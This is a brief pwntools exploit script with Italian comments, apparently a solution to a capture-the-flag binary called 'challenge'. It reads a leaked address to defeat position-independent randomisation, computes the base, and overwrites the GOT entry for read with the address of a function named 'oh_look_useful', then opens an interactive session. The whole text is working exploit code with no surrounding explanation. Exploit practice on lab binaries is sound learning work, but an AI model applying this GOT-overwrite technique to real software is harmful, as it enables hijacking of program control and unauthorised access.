from pwn import *

p = process("./challenge")

# indirizzo base (leak - offset main)
leak = u32(p.read(4))
base_addr = leak - 0x1235

# indirizzo funzione oh_look_useful
func_addr = base_addr + 0x11ed

#indirizzo got read
read_addr = base_addr + 0x32dc

p.send(p32(read_addr))
p.send(p32(func_addr))

p.interactive()
